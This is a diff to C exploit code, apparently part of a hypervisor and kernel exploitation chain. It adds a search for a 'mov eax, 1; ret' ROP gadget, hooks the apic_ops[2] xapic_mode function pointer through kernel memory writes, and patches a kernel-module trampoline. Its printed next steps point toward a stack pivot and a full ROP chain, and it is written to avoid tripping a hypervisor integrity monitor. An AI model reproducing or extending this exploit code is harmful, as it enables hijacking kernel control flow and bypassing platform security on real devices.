@@ -6662,8 +6662,8 @@ phase9_not_armed:
     /*
      * Gadget patterns we're looking for:
      * These are useful for the apic_ops xapic_mode hook, where
-     * xapic_mode is void(*)(void) — no args, no meaningful
-     * register state on entry (all caller-saved regs are scratch).
+     * xapic_mode is int(*)(void) — no args, returns APIC mode.
+     * MUST return 1 (xAPIC) for LAPIC suspend to work correctly.
      */
     static const uint8_t pat_ret[]           = { 0xC3 };
     static const uint8_t pat_xchg_rsp_rax[]  = { 0x48, 0x94, 0xC3 };
@@ -6680,10 +6680,12 @@ phase9_not_armed:
     static const uint8_t pat_mov_rsp_rax[]   = { 0x48, 0x89, 0xC4, 0xC3 };
     /* mov [rdi], rax; ret — write gadget (useful if rdi is controlled) */
     static const uint8_t pat_mov_rdi_rax[]   = { 0x48, 0x89, 0x07, 0xC3 };
-    /* xor eax, eax; ret — returns 0, safe NOP-like gadget */
+    /* xor eax, eax; ret — returns 0 (UNSAFE for xapic_mode hook!) */
     static const uint8_t pat_xor_eax_ret[]   = { 0x31, 0xC0, 0xC3 };
     /* push rbp; mov rbp, rsp — function prologue (CFI valid target) */
     static const uint8_t pat_prologue[]      = { 0x55, 0x48, 0x89, 0xE5 };
+    /* mov eax, 1; ret — returns 1 (correct xAPIC mode for LAPIC suspend) */
+    static const uint8_t pat_mov_eax_1_ret[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
     /* wrmsr; ... ret (wrmsr followed by ret within 4 bytes) */
     static const uint8_t pat_wrmsr_ret[]     = { 0x0F, 0x30, 0xC3 };
     /* cli; ret (disable interrupts) */
@@ -6711,6 +6713,7 @@ phase9_not_armed:
         { "cli; ret",            pat_cli_ret,      2, 1 },
         { "sti; ret",            pat_sti_ret,      2, 1 },
         { "push rbp; mov rbp, rsp (prologue)", pat_prologue, 4, 0 },
+        { "mov eax, 1; ret",    pat_mov_eax_1_ret, 6, 1 },
     };
     int n_gadgets = sizeof(gadgets) / sizeof(gadgets[0]);
 
@@ -6835,12 +6838,12 @@ phase9_not_armed:
 
     /*
      * For the apic_ops xapic_mode hook:
-     *   - xapic_mode is void(*)(void): no args, all regs are scratch
+     *   - xapic_mode is int(*)(void): no args, returns APIC mode (1=xAPIC)
      *   - Called from cpususpend_handler during resume
-     *   - Stack has return address to cpususpend_handler
+     *   - MUST return 1 (APIC_MODE_XAPIC) — returning 0 panics LAPIC suspend
      *
-     * Strategy 1: "Safe NOP" — write a ret gadget to prove the hook fires
-     *   apic_ops[2] = &ret → function returns immediately → system resumes
+     * Strategy 1: "Safe hook" — write "mov eax, 1; ret" to return correct xAPIC mode
+     *   apic_ops[2] = &gadget → returns 1 (APIC_MODE_XAPIC) → system resumes
      *
      * Strategy 2: Stack pivot → full ROP chain
      *   Requires: "pop rsp; ret" or "xchg rsp, rax; ret"
@@ -6851,16 +6854,21 @@ phase9_not_armed:
      *   "wrmsr; ret" — if ECX/EAX/EDX are set up, writes arbitrary MSR
      */
 
-    /* Strategy 1: Safe ret */
-    if (hits[0].count > 0) {
-        printf("[STRATEGY 1] Safe ret (prove hook fires without crashing):\n");
+    /* Strategy 1: Safe hook — return correct xAPIC mode */
+    if (hits[19].count > 0) {
+        printf("[STRATEGY 1] Safe hook (returns 1 = xAPIC mode):\n");
+        printf("    Gadget: mov eax, 1; ret at 0x%lx (ktext+0x%lx)\n",
+               (unsigned long)hits[19].addrs[0],
+               (unsigned long)(hits[19].addrs[0] - g_ktext_base));
+        printf("    Write this to apic_ops[2], trigger suspend/resume.\n");
+        printf("    xapic_mode returns 1 → LAPIC suspend works correctly.\n\n");
+    } else if (hits[0].count > 0) {
+        printf("[STRATEGY 1] Bare ret (RISKY — xapic_mode returns garbage):\n");
         printf("    Gadget: ret at 0x%lx (ktext+0x%lx)\n",
                (unsigned long)hits[0].addrs[0],
                (unsigned long)(hits[0].addrs[0] - g_ktext_base));
-        printf("    Write this to apic_ops[2], trigger suspend/resume.\n");
-        printf("    If system resumes normally → hook FIRED.\n");
-        printf("    (xapic_mode was replaced with ret, LAPIC not reinitialized,\n");
-        printf("     but system should still work for basic testing)\n\n");
+        printf("    WARNING: xapic_mode must return 1 — bare ret returns\n");
+        printf("    undefined value → likely kernel panic during suspend!\n\n");
     }
 
     /* Strategy 2: Stack pivot */
@@ -6918,6 +6926,9 @@ phase9_not_armed:
     printf("    mov cr0, rax:  %s\n",
            hits[10].count > 0 ?
            "FOUND" : "NOT FOUND");
+    printf("    mov eax,1;ret: %s\n",
+           hits[19].count > 0 ?
+           "FOUND" : "NOT FOUND");
 
     int rop_ready = (hits[1].count > 0) && (hits[5].count > 0) &&
                     (hits[0].count > 0);
@@ -6932,36 +6943,53 @@ phase9_not_armed:
     }
 
     /*
-     * ─── Phase 7 Cycle 2: Hook apic_ops[2] → ktext gadget ───
+     * ─── Phase 7 Cycle 2: Hook apic_ops[2] → safe hook target ───
      *
      * We are in the post-XOM-bypass state (ktext is readable).
-     * If "xor eax, eax; ret" was found in ktext, we can safely
-     * hook apic_ops[2] to that ktext address.  Since the gadget
-     * lives in ktext (natively executable), NO NX clearing is
-     * needed — the HV integrity monitor won't object.
+     * Hook apic_ops[2] to a target that returns the correct APIC
+     * mode value.  xapic_mode() is int(*)(void) — it MUST return
+     * 1 (APIC_MODE_XAPIC) for the LAPIC suspend sequence to work.
+     * Returning 0 (xor eax, eax; ret) or garbage (bare ret) causes
+     * kernel panic during suspend — the LAPIC shutdown path depends
+     * on this return value.
      *
-     * gadget index 9 = "xor eax, eax; ret" (0x31 0xC0 0xC3)
-     *   - Returns 0 in EAX (harmless)
-     *   - Valid function-return behavior
-     *   - Safe to call from cpususpend_handler context
+     * Priority:
+     *   1. "mov eax, 1; ret" ktext gadget (returns 1 = xAPIC mode)
+     *   2. KLD trampoline_xapic_mode() (calls original, returns real value)
+     *   3. Skip hook (no safe target available)
      */
-    if (hits[9].count > 0) {
-        uint64_t gadget_addr = hits[9].addrs[0];
-        printf("\n[*] Phase 7 Cycle 2: Hooking apic_ops[2] → ktext gadget\n\n");
-        printf("    Gadget: \"xor eax, eax; ret\" at 0x%016lx\n",
-               (unsigned long)gadget_addr);
-        printf("    (ktext+0x%lx)\n",
-               (unsigned long)(gadget_addr - g_ktext_base));
+    uint64_t gadget_addr = 0;
+    const char *gadget_name = NULL;
+    int gadget_in_ktext = 0;
 
-        /* Verify gadget is in ktext range */
-        int gadget_in_ktext = (gadget_addr >= g_ktext_base &&
-                               gadget_addr < g_ktext_base + 0x2000000);
+    /* Priority 1: "mov eax, 1; ret" — returns correct xAPIC mode */
+    if (hits[19].count > 0) {
+        gadget_addr = hits[19].addrs[0];
+        gadget_name = "mov eax, 1; ret (returns 1 = xAPIC)";
+        gadget_in_ktext = (gadget_addr >= g_ktext_base &&
+                           gadget_addr < g_ktext_base + 0x2000000);
+        if (!gadget_in_ktext) gadget_addr = 0;
+    }
+
+    /* Priority 2: KLD trampoline (transparent passthrough to original) */
+    if (!gadget_addr && g_kmod_trampoline_func) {
+        gadget_addr = g_kmod_trampoline_func;
+        gadget_name = "KLD trampoline_xapic_mode() (calls original)";
+        gadget_in_ktext = 0;  /* in KLD .text, not ktext */
+    }
+
+    if (gadget_addr) {
+        printf("\n[*] Phase 7 Cycle 2: Hooking apic_ops[2] → safe target\n\n");
+        printf("    Target: %s\n", gadget_name);
+        printf("    Address: 0x%016lx\n", (unsigned long)gadget_addr);
+        if (gadget_in_ktext)
+            printf("    (ktext+0x%lx)\n",
+                   (unsigned long)(gadget_addr - g_ktext_base));
+
         /* Resolve apic_ops physical address (ops_pa was in Phase 7 scope) */
         uint64_t hook_ops_pa = va_to_pa_quiet(g_apic_ops_addr);
 
-        if (!gadget_in_ktext) {
-            printf("[-] Gadget address outside ktext — aborting hook.\n");
-        } else if (!hook_ops_pa) {
+        if (!hook_ops_pa) {
             printf("[-] apic_ops VA→PA failed — aborting hook.\n");
         } else {
             /* Read current apic_ops[2] value */
@@ -6969,6 +6997,16 @@ phase9_not_armed:
             kernel_copyout(g_dmap_base + hook_ops_pa + 0x10, &current_xapic, 8);
             printf("    Current apic_ops[2]: 0x%016lx\n",
                    (unsigned long)current_xapic);
+
+            /* If using KLD trampoline, patch g_trampoline_target first */
+            if (!gadget_in_ktext && g_kmod_trampoline_func &&
+                g_kmod_trampoline_target) {
+                printf("    Patching trampoline target → 0x%016lx (original xapic)\n",
+                       (unsigned long)current_xapic);
+                kernel_copyin(&current_xapic,
+                              g_dmap_base + va_to_pa_quiet(g_kmod_trampoline_target),
+                              8);
+            }
 
             /* Save original in cave marker (if not already there) */
             uint64_t cave_pa_h = va_to_pa_quiet(g_kdata_base);
@@ -6980,14 +7018,12 @@ phase9_not_armed:
 
                 if (existing_magic == P7_CAVE_MAGIC) {
                     printf("    Cave marker from cycle 1 detected — good.\n");
-                    /* Original xapic is already saved at cave_check[0x08] */
                     uint64_t saved_orig = 0;
                     memcpy(&saved_orig, &cave_check[0x08], 8);
                     printf("    Original xapic (from cave): 0x%016lx\n",
                            (unsigned long)saved_orig);
                 } else {
                     printf("    No cave marker — saving original xapic now.\n");
-                    /* Write a new cave marker with current apic_ops[2] as original */
                     uint8_t new_marker[P7_MARKER_SIZE];
                     memset(new_marker, 0, sizeof(new_marker));
                     uint64_t magic = P7_CAVE_MAGIC;
@@ -6999,8 +7035,8 @@ phase9_not_armed:
                 }
             }
 
-            /* Write the ktext gadget address to apic_ops[2] */
-            printf("\n    Writing gadget to apic_ops[2]...\n");
+            /* Write the hook target address to apic_ops[2] */
+            printf("\n    Writing hook target to apic_ops[2]...\n");
             kernel_copyin(&gadget_addr, g_dmap_base + hook_ops_pa + 0x10, 8);
 
             /* Verify the write */
@@ -7013,21 +7049,21 @@ phase9_not_armed:
 
             if (hook_ok) {
                 printf("\n[+] ============================================\n");
-                printf("[+]  APIC_OPS[2] HOOKED → KTEXT GADGET!\n");
+                printf("[+]  APIC_OPS[2] HOOKED → SAFE TARGET!\n");
                 printf("[+] ============================================\n");
                 printf("[+]\n");
                 printf("[+] Hook details:\n");
                 printf("[+]   apic_ops[2] → 0x%016lx\n",
                        (unsigned long)gadget_addr);
-                printf("[+]   Gadget: xor eax, eax; ret (returns 0)\n");
-                printf("[+]   Location: ktext (natively executable)\n");
+                printf("[+]   Target: %s\n", gadget_name);
+                printf("[+]   Returns: 1 (APIC_MODE_XAPIC) — safe for LAPIC suspend\n");
                 printf("[+]   NX clearing: NOT NEEDED\n");
                 printf("[+]\n");
                 printf("[+] NEXT STEPS:\n");
                 printf("[+]   1. Enter REST MODE now\n");
                 printf("[+]   2. On resume: cpususpend_handler calls\n");
-                printf("[+]      xapic_mode → our gadget → returns 0\n");
-                printf("[+]   3. If no kernel panic: HOOK FIRES SAFELY!\n");
+                printf("[+]      xapic_mode → our target → returns 1\n");
+                printf("[+]   3. LAPIC suspend completes normally\n");
                 printf("[+]   4. Replace with stack pivot for full ROP\n");
 
                 /* Store hook-armed state in QA flags */
@@ -7042,7 +7078,7 @@ phase9_not_armed:
                 printf("[+]\n");
                 printf("[+] QA flags set with original xapic for restore.\n");
 
-                notify("[HV Research] Phase 7: apic_ops[2] hooked to ktext gadget! Enter REST MODE!");
+                notify("[HV Research] Phase 7: apic_ops[2] hooked (returns 1)! Enter REST MODE!");
             } else {
                 printf("\n[-] Hook write verification failed.\n");
                 printf("    apic_ops[2] NOT modified as expected.\n");
@@ -7050,13 +7086,10 @@ phase9_not_armed:
             }
         }
     } else {
-        printf("\n[-] \"xor eax, eax; ret\" gadget NOT found in ktext.\n");
-        printf("    Cannot hook apic_ops[2] to a safe ktext target.\n");
-        if (hits[0].count > 0) {
-            printf("[*] Fallback: bare \"ret\" gadget available at 0x%016lx\n",
-                   (unsigned long)hits[0].addrs[0]);
-            printf("    This is riskier (doesn't clear EAX) but could work.\n");
-        }
+        printf("\n[-] No safe hook target found for apic_ops[2].\n");
+        printf("    Need \"mov eax, 1; ret\" in ktext or KLD trampoline.\n");
+        printf("[!] \"xor eax, eax; ret\" returns 0 — causes kernel panic!\n");
+        printf("[!] LAPIC suspend requires xapic_mode() to return 1 (xAPIC).\n");
     }
 
     printf("\n");
